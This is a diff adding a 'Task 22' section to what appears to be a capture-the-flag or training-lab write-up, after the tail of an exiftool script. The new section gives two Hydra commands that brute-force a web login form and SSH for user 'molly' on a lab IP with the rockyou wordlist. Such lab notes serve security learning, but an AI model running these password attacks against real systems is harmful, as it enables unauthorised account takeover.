@@ -1056,3 +1056,17 @@ with exiftool.ExifTool() as et:
 print("Total files with Version 1.1 = {}".format(version_counter))
 print("Password file = {}".format(password_file))
 ```
+
+# Task 22
+Using Hydra to bruteforce
+
+* Brute forcing a web app
+    ```
+    hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.43.192 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+    ```
+* Brute forcing SSH
+    ```
+    hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.43.192 ssh -V
+    ```
+
+# Task 23
